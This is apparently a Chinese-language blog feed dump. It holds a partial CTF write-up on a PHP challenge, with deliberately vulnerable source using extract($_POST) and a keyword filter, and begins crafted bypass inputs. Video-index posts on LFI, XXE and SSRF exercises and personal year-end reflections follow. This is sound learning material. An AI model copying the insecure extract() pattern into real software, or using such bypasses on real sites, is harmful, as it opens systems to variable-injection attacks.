        <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="寻宝"><a href="#寻宝" class="headerlink" title="寻宝"></a>寻宝</h2><p>开局给了源代码，那应该是考察php的特性了，我们一点一点的看，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$filter_word</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;index&#x27;</span>,<span class="string">&#x27;KeY1lhv&#x27;</span>,<span class="string">&#x27;source&#x27;</span>,<span class="string">&#x27;key&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;echo&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\(&#x27;</span>,<span class="string">&#x27;\.&#x27;</span>,<span class="string">&#x27;num&#x27;</span>,<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;\/&#x27;</span>,<span class="string">&#x27;\,&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;0000000&#x27;</span>);</span><br><span class="line">        <span class="variable">$filter_phrase</span>= <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_word</span>).<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> preg_replace(<span class="variable">$filter_phrase</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ppp</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$ppp</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ppp</span>[<span class="string">&#x27;number1&#x27;</span>] = <span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$ppp</span>[<span class="string">&#x27;number2&#x27;</span>] = <span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$ppp</span>[<span class="string">&#x27;nunber3&#x27;</span>] = <span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$ppp</span>[<span class="string">&#x27;number4&#x27;</span>] = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="variable">$ppp</span>[<span class="string">&#x27;number5&#x27;</span>] = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"></span><br><span class="line">extract(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$num1</span> = filter(<span class="variable">$ppp</span>[<span class="string">&#x27;number1&#x27;</span>]);        </span><br><span class="line"><span class="variable">$num2</span> = filter(<span class="variable">$ppp</span>[<span class="string">&#x27;number2&#x27;</span>]);        </span><br><span class="line"><span class="variable">$num3</span> = filter(<span class="variable">$ppp</span>[<span class="string">&#x27;number3&#x27;</span>]);        </span><br><span class="line"><span class="variable">$num4</span> = filter(<span class="variable">$ppp</span>[<span class="string">&#x27;number4&#x27;</span>]);</span><br><span class="line"><span class="variable">$num5</span> = filter(<span class="variable">$ppp</span>[<span class="string">&#x27;number5&#x27;</span>]);    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$num1</span>) &amp;&amp; is_numeric(<span class="variable">$num1</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;非数字&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num1</span> &gt; <span class="number">1024</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;第一层&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$num2</span>) &amp;&amp; strlen(<span class="variable">$num2</span>) &lt;= <span class="number">4</span> &amp;&amp; intval(<span class="variable">$num2</span> + <span class="number">1</span>) &gt; <span class="number">500000</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;第二层&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$num3</span>) &amp;&amp; <span class="string">&#x27;4bf21cd&#x27;</span> === substr(md5(<span class="variable">$num3</span>),<span class="number">0</span>,<span class="number">7</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;第三层&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span>(!(<span class="variable">$num4</span> &lt; <span class="number">0</span>)&amp;&amp;(<span class="variable">$num4</span> == <span class="number">0</span>)&amp;&amp;(<span class="variable">$num4</span> &lt;= <span class="number">0</span>)&amp;&amp;(strlen(<span class="variable">$num4</span>) &gt; <span class="number">6</span>)&amp;&amp;(strlen(<span class="variable">$num4</span>) &lt; <span class="number">8</span>)&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$num4</span>) )&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;第四层&quot;</span>;</span><br><span class="line">                    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$num5</span>)||(strlen(<span class="variable">$num5</span>)==<span class="number">0</span>)) <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">                    <span class="variable">$b</span>=json_decode(@<span class="variable">$num5</span>);</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$y</span> = <span class="variable">$b</span> === <span class="literal">NULL</span>)&#123;</span><br><span class="line">                                <span class="keyword">if</span>(<span class="variable">$y</span> === <span class="literal">true</span>)&#123;</span><br><span class="line">                                    <span class="keyword">echo</span> <span class="string">&quot;第五层&quot;</span>;</span><br><span class="line">                                    <span class="keyword">include</span> <span class="string">&#x27;KeY1lhv.php&#x27;</span>;</span><br><span class="line">                                    <span class="keyword">echo</span> <span class="variable">$KEY1</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                            <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">               <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no111&quot;</span>);&#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$filter_word</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;index&#x27;</span>,<span class="string">&#x27;KeY1lhv&#x27;</span>,<span class="string">&#x27;source&#x27;</span>,<span class="string">&#x27;key&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;echo&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\(&#x27;</span>,<span class="string">&#x27;\.&#x27;</span>,<span class="string">&#x27;num&#x27;</span>,<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;\/&#x27;</span>,<span class="string">&#x27;\,&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;0000000&#x27;</span>);</span><br><span class="line">        <span class="variable">$filter_phrase</span>= <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_word</span>).<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> preg_replace(<span class="variable">$filter_phrase</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>开头给我们过滤了一些词，也就是说我们给的payload不可以有这些单词，这里面感觉最有用的就是<code>000000</code> 了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$num1</span>) &amp;&amp; is_numeric(<span class="variable">$num1</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;非数字&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num1</span> &gt; <span class="number">1024</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;第一层&quot;</span>;</span><br></pre></td></tr></table></figure><p>这个第一层是必须要输入num1，且不能是数字，是数字的话，就直接进入else<code>die</code>了。<br>那么这里我们可以用<code>is_numeric</code>的一个缺陷来利用，<code>is_numeric</code>函数判断变量是否为数字，如果是数字返回1，否则返回0，但当输入的变量有数字和字母时，它会截取第一个字母之前的数字，且返回0，举个栗子，<code>is_numeric(1234abc123)</code>，这里它会取1234，而后面的abc他就不要了。那这样的话我们第一层，这里我们只需<code>ppp[number1]=2222a</code>，只要比1024大就可以了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$num2</span>) &amp;&amp; strlen(<span class="variable">$num2</span>) &lt;= <span class="number">4</span> &amp;&amp; intval(<span class="variable">$num2</span> + <span class="number">1</span>) &gt; <span class="number">500000</span>)&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&quot;第二层&quot;</span>;</span><br></pre></td></tr></table></figure><p>第二层，必须输入输入num2且长度小于或等于4且这个数加一要大于500000<br>正常四位数最大9999显然不大于500000<br>这里我们可以用php里的科学计数法，<code>1e3=1*10^3</code>也就是说</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> 强网杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>合天网安weekly,10-18周</title>
      <link href="/2020/09/10/%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89/%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%97wp10-18/"/>
      <url>/2020/09/10/%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89/%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%97wp10-18/</url>
      
        <content type="html"><![CDATA[<h1 id="第九周-试下phpinfo吧"><a href="#第九周-试下phpinfo吧" class="headerlink" title="第九周 | 试下phpinfo吧"></a>第九周 | 试下phpinfo吧</h1><p>视频讲解👉<a href="https://www.bilibili.com/video/BV1WZ4y1H7gt">第九周 | 试下phpinfo吧</a></p><h1 id="第十周-试试协议吧"><a href="#第十周-试试协议吧" class="headerlink" title="第十周 | 试试协议吧"></a>第十周 | 试试协议吧</h1><p>视频讲解👉<a href="https://www.bilibili.com/video/BV1Hz411v7c7">第十周 | 试试协议吧</a></p><hr><h1 id="第十一周-签到般的包含"><a href="#第十一周-签到般的包含" class="headerlink" title="第十一周 | 签到般的包含"></a>第十一周 | 签到般的包含</h1><p>视频讲解👉<a href="https://www.bilibili.com/video/BV18v411q7mr">第十一周 | 签到般的包含</a></p><hr><h1 id="第十二周-easy-LFI"><a href="#第十二周-easy-LFI" class="headerlink" title="第十二周 | easy LFI"></a>第十二周 | easy LFI</h1><p>视频讲解👉<a href="https://www.bilibili.com/video/BV1jD4y1U7Vy">第十二周 | easy LFI</a></p><hr><h1 id="第十三周-simple-xxe"><a href="#第十三周-simple-xxe" class="headerlink" title="第十三周 | simple xxe"></a>第十三周 | simple xxe</h1><p>视频讲解👉<a href="https://www.bilibili.com/video/BV1eT4y1j7ff/">第十三周 | simple xxe</a></p><hr><h1 id="第十四周-blind-xxe"><a href="#第十四周-blind-xxe" class="headerlink" title="第十四周 | blind xxe"></a>第十四周 | blind xxe</h1><p>视频讲解👉<a href="https://www.bilibili.com/video/BV1nK411n7G9/">第十四周 | blind xxe</a></p><hr><h1 id="第十五周-回显的SSRF"><a href="#第十五周-回显的SSRF" class="headerlink" title="第十五周 | 回显的SSRF"></a>第十五周 | 回显的SSRF</h1><p>视频讲解👉<a href="https://www.bilibili.com/video/BV18f4y197Lz/">第十五周 | 回显的SSRF</a></p><hr><h1 id="第十六周-有点另类的SSRF"><a href="#第十六周-有点另类的SSRF" class="headerlink" title="第十六周 | 有点另类的SSRF"></a>第十六周 | 有点另类的SSRF</h1><p>视频讲解👉<a href="https://www.bilibili.com/video/BV1g54y1U7Gj/">第十六周 | 有点另类的SSRF</a></p><hr><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>打波广告,我的bilibili主页<a href="https://space.bilibili.com/454748309">关注我</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> 合天网安 </tag>
            
            <tag> 视频讲解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>合天网安weekly,1-9周</title>
      <link href="/2020/05/30/%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89/%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%97wp1-9/"/>
      <url>/2020/05/30/%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89/%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%97wp1-9/</url>
      
        <content type="html"><![CDATA[<hr><h1 id="第一周-神奇的磁带"><a href="#第一周-神奇的磁带" class="headerlink" title="第一周 | 神奇的磁带"></a>第一周 | 神奇的磁带</h1><p>视频讲解👉<a href="https://www.bilibili.com/video/BV1DA411q7Go">第一周 | 神奇的磁带</a></p><hr><h1 id="第二周-就差一把钥匙"><a href="#第二周-就差一把钥匙" class="headerlink" title="第二周 | 就差一把钥匙"></a>第二周 | 就差一把钥匙</h1><p>视频讲解👉<a href="https://www.bilibili.com/video/BV1np4y1X7L5">第二周 | 就差一把钥匙</a></p><hr><h1 id="第三周-迷了路"><a href="#第三周-迷了路" class="headerlink" title="第三周 | 迷了路"></a>第三周 | 迷了路</h1><p>视频讲解👉<a href="https://www.bilibili.com/video/BV16K4y1t7jg">第三周 | 迷了路</a></p><hr><h1 id="第四周-Check-your-source-code"><a href="#第四周-Check-your-source-code" class="headerlink" title="第四周 | Check your source code"></a>第四周 | Check your source code</h1><p>视频讲解👉<a href="https://www.bilibili.com/video/BV1254y1D7Jy">第四周 | Check your source code</a></p><hr><h1 id="第五周-Easy-upload"><a href="#第五周-Easy-upload" class="headerlink" title="第五周 | Easy upload"></a>第五周 | Easy upload</h1><p>视频讲解👉<a href="https://www.bilibili.com/video/BV1KT4y1g7kr">第五周 | Easy upload</a></p><hr><h1 id="第六周-套娃一样的上传"><a href="#第六周-套娃一样的上传" class="headerlink" title="第六周 | 套娃一样的上传"></a>第六周 | 套娃一样的上传</h1><p>视频讲解👉<a href="https://www.bilibili.com/video/BV1mZ4y1p7vz">第六周 | 套娃一样的上传</a></p><hr><h1 id="第七周-再见上传"><a href="#第七周-再见上传" class="headerlink" title="第七周 | 再见上传"></a>第七周 | 再见上传</h1><p>视频讲解👉<a href="https://www.bilibili.com/video/BV1J5411x7Pt">第七周 | 再见上传</a></p><hr><h1 id="第八周-随意的上传"><a href="#第八周-随意的上传" class="headerlink" title="第八周 | 随意的上传"></a>第八周 | 随意的上传</h1><p>视频讲解👉<a href="https://www.bilibili.com/video/BV14K411n7Wx">第八周 | 随意的上传</a></p><hr><h1 id="第九周-试下phpinfo吧"><a href="#第九周-试下phpinfo吧" class="headerlink" title="第九周 | 试下phpinfo吧"></a>第九周 | 试下phpinfo吧</h1><p>视频讲解👉<a href="https://www.bilibili.com/video/BV1WZ4y1H7gt">第九周 | 试下phpinfo吧</a><br><br></p><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>打波广告,我的bilibili主页<a href="https://space.bilibili.com/454748309">关注我</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> 合天网安 </tag>
            
            <tag> 视频讲解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>welcome</title>
      <link href="/2020/05/08/hello/"/>
      <url>/2020/05/08/hello/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="nonono" data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="de5ffb3c355c37ef799db2811598b2e070118f1713db3c35b69817df54f1f8bd">7d8077bcea34d13a4778951ea2d2a1ccce0256bcc5d53f74bd6a858a945ec856276f2040ce3d91d145e95f65e63f536f564e07d3cc9ab9bb1fec22f262ad5a1e4fc99d0818f3a1cac7c2a6ea11b53f62975da05ba3343ad48b5b02b81e9efdecc44f4cfae33f5b10a48fc74460bc07491e960d4fafcb54b004ecfbeea566d704f0c8dbe63cbc78689d284f0b5ad3a587f242b222d0b826a89be3bd4b53523e4bc9784da2af2b9a4b4964e07bf508abff229ea78940ea4ab41dcb1bc2e390f9b90a3a4d5305b40a26e6a9bff33925686133c51d622f4a40bd556070284614620e2478b030f3e24a2f0fc1059e8599c5d6d0113e42c0625302624527d4c5bbe72d2047dfe2b04d78e73e5a0e581acdfd5e25fa6e38bd1cc24c265adf6d30fc068f6c4a4780a711c842d7a61d4a47ee8279eddfe9b090d6b98ab038348eeb86901f543edcd2263d3754d9ba2365ec8b1ada36f8cd6f88f8f0487f1f87c6cb1f2d436f513591ad5424d63cac089b792a884c4b773dc9738c626011ece68dbfe6a418dd7dada87289fa995942802846b8636490a62484c23728ffde04fc9f4475713dee7b1cfdf174e13d275c70ceeda5876c7392d6f064ec19ebaf13a894258a7d8577b9e722cfa10daef2e53f7918b0aeab</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">please input my name</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>my2021</title>
      <link href="/2000/01/31/my/my2021/"/>
      <url>/2000/01/31/my/my2021/</url>
      
        <content type="html"><![CDATA[<p>首先，新年到啦，先祝大家新年快乐啦！<br>很快，2021年已经过去了，感觉还没学到什么时间就很快的过去了，也可能是自己没有把握好时间吧。一年确实也认识了好多好多的人，也经历了好多好多的事情，在此也记录下2021年所发生有趣且有意义的事情吧。</p><p><img src="/images/my2021/1.png" alt="image-20220130142802861"></p><p>一二三月份都在准备考试，最后不管怎么样吧，考上了，还是挺高兴的。</p><p>五月份，首先在还是要感谢澳哥带我打进铁人总决赛吧，人生中第一次在这么大的舞台上，和众多高校的小伙伴一起打比赛，真的是太强了，感受颇多。打比赛很累，做不出题来，更累。还是那句话人外有人，天外有天，强的人真是太多了，不努力的话，真的啥也不是。记录一下参赛过程吧，贴两张照片。感谢澳哥。<img src="/images/my2021/2.png" alt="image-20220130144246418"></p><p><img src="/images/my2021/3.png" alt="image-20220130144314957"></p><p><img src="/images/my2021/4.png" alt="image-20220130144329029"></p><p><img src="/images/my2021/5.png" alt="image-20220130144830848"></p><p>五月份作为特邀战队参加了津门杯，感谢张老师对我的信任，让我带队，带学弟和学妹参加比赛，真是到了赛场上才知道自己有多菜，坐在电脑前就很紧张，一会干这，一会干那，手忙脚乱的，最主要的原因还是脑子里没有那么多东西吧，那些高校战队真的太强了，被打的很惨。不过，最后也有幸也去了世界智能大会，虽然没听懂吧，但是我还是装听懂了吧。贴两张照片记录一下吧。感谢张老师和学弟学妹。</p><p><img src="/images/my2021/6.png" alt="image-20220130145559697"></p><p><img src="/images/my2021/7.png" alt="image-20220130145615187"></p><p><img src="/images/my2021/8.png" alt="image-20220130145623269"></p><p><img src="/images/my2021/9.png" alt="image-20220130145635833"></p><p><img src="/images/my2021/10.png" alt="image-20220130145713244"></p><p><img src="/images/my2021/11.png" alt="image-20220130150437476"></p><p>六月底七月初也为国家做了一些贡献吧。当然也给自己增加技术和经验以及履历了。感谢绳哥。</p><p>九月份第一次站在这么大的舞台上演讲，很紧张，也很期待。总体来说还算成功吧，感谢小伙伴帮我拍的照，贴一张吧。打码打码。</p><p><img src="/images/my2021/12.png" alt="image-20220130163040609"></p><p>十月份。感谢于老师。让我能有一次锻炼自己的机会。</p><p>十一月份也去了海河工匠杯，成绩中规中矩吧，证书就不贴了，也没啥意思。不过那天起的非常早，雪非常大，风非常大，路非常滑，天也贼冷。</p><p>还有天津市赛，第一次参加，还是太菜了，没有拿到名次，愧疚了好久，辜负了西普老师对我的期望，哎，谁也不怪，只能说准备的不充分。人家比我们准备的多，哎，没办法，总结教训，继续努力吧。感谢西普的老师，感谢我的小伙伴们。</p><p>感谢陈老师的键盘和鼠标。</p><p>感谢郭老师对我的信任。让我能有一次锻炼自己的机会。</p><p>后面就是非常幸运的进入了西普这个大家庭吧，认识了许多可爱的小伙伴，和厉害的老师。希望能在这里不浪费时间，学习到更多知识吧。感谢西普的老师。</p><p>感谢凡哥对我的信任。我尽力。</p><p>感谢父母。</p><p>今年也遇到了许多可爱的小伙伴，和厉害的师傅，学到了很多以前没有见过的东西。今年也浪费了好多的时间放在自己不喜欢的事情上，明年或许也会花许多时间放在自己不喜欢的地方，哎没办法，谁让自己起点低呢。加油吧！</p><p>好久好久以前就有了这个博客，但是由于各种各样的原因吧，都没有及时的更新文章，有的时候感觉一个小比赛就解出来一道题，或简单的题，没必要记录，但是后来在遇到这个题发现是以前见到过的，有没有笔记，各种百度浪费时间，还找不到自己想要的。另一方面感觉做这个事情也是挺锻炼自己的，写出来解题过程很开心。以后会监督自己，时常更新博客，多做题。说的再多，归根结底还是自己太懒了吧。以后勤奋一些。多做有意义的事情。多更博客。</p><p>”我从不相信一帆风顺的说法，一帆风顺代表着你没有遇到任何困难，也就说你没有经历过打击，也就没有积累相对应的经验。学走路要经历摔跤，学骑自行车要经历摔跤，学滑雪要经历摔跤，你需要体验那种摔跤的痛感，你才能够在摔跤前做出相应的动作来让自己回归正轨。我们假设一个场景，你下面是万丈深渊，而你要徒手攀岩，从一个垂直坡度的山脚，爬到上千米的山顶。用脚指头都能想到，你死亡的场景无数个，只要一次失误你就可能掉落山崖粉身碎骨，而你的成功场景只有一个：活着上去。所以你对这座山要有心存敬畏，要小心翼翼，不炫技不张扬，你要调整到最谦卑的状态，远离喧嚣，听到自己心跳的声音，敬畏每一个抓手点。抓手的点很多，有大有小，你不能重视一个而轻视另一个，因为你轻视任何一个的后果都是一样的，那就是死亡。“  </p><p>送给自己，谦卑一些。</p><p>生日快乐~<br><img src="/images/my2021/13.png" alt="image-20220130172521536"></p><blockquote><p>生日快乐<br>一直在路上<br>加油！<br>读书太少，想的太多</p><p>date: 2022-01-31 00:00:00</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>my2022</title>
      <link href="/2000/01/20/my/my2022/"/>
      <url>/2000/01/20/my/my2022/</url>
      
        <content type="html"><![CDATA[<p>首先，新年到了，祝大家新年快乐喽！<br>很快，2022年已经过去了，2023年已经过去20多天了，时间就很快的过去了，也可能是自己没有把握好时间吧。在过去的一年中认识了一些人，都非常有趣。也遇到了很多有趣的事情。</p><p>感谢jackie哥给我推重保，二月份冬奥会去重保，认识了好几个有趣的哥哥，人都挺好的，还总帮我登机器。感谢。后面还帮他们写了个小脚本，帮他们筛选日志中有用信息导出excel，由于内网使用还封成了exe，完事后那边的哥说贼还用，帮他们省去了90%的时间，还很感谢我。瞬间感觉其实看设备不适合我，我感觉运维比较适合我。因为，……。</p><p>四月份和五月份吧，感谢俺们郭老师让我帮他带了十几天课，感谢郭老师又给我了一次这么好的锻炼机会。感觉当老师好辛苦啊，emmmm，其实当导师不是很辛苦，就是有些东西明明在课上我已经讲过了，然后呢，有同学课下又来问，而且还不是一个同学问，好多同学都来问。这里可能不是我没有讲过，是我布置了作业，都没有听，来问的很累。布置作业也很累。emmmm，还有一个，同学抄作业也挺严重的，那作业截图linux用户名都一样，我裂开。看到作业，我瞬间感觉我这个老师当的很失败，没有教会大家。最后一点，要是当老师不用布置作业，不用改作业，同学们不要一直问同一个我上课讲过的问题的话，我感觉当老师还是蛮舒服的。讲课做视频还是蛮不错的，没有售后。</p><p>七月份，感谢A佬给我推了个讲ctf课的兼职。从中也学到了许多讲课的技巧，也学到了很多知识。我觉得现在让我打2019年那个awd比赛，我一定打穿他们。感谢A佬。</p><p>八月份还回家学了个车，emmm，难度中等吧，希望早点拿到证，就能开车了。</p><p>九月，感谢凡哥信任我，给我锻炼自己的机会，让我参加了个讲座。</p><p>十一月份的天津大学生ctf比赛，emmmm，怎么说呢，初赛打的还行，决赛嘛，感觉还是自己太菜了一点，没有团队。一个人的能力确实是有限的，当然不能排除那些全栈的大佬，是真的强。比赛也就得了二等奖，少点py，少点代打，或许有机会拿个一等奖。以学生身参加的比赛越来越少了，珍惜吧。不过安全这条路，我是不会放弃的。</p><blockquote><p>十二月份就比较特殊了，这是我这一年中发生的最大的事情了，得到了一个我喜欢的女孩。从此以后，我也将不再是孤单的一人。身份也多了一个，感觉肩上的责任更重了些。</p><p>终于和过去说了再见，是时候开始新的生活了。</p><p><img src="/images/my2022/1.jpg" 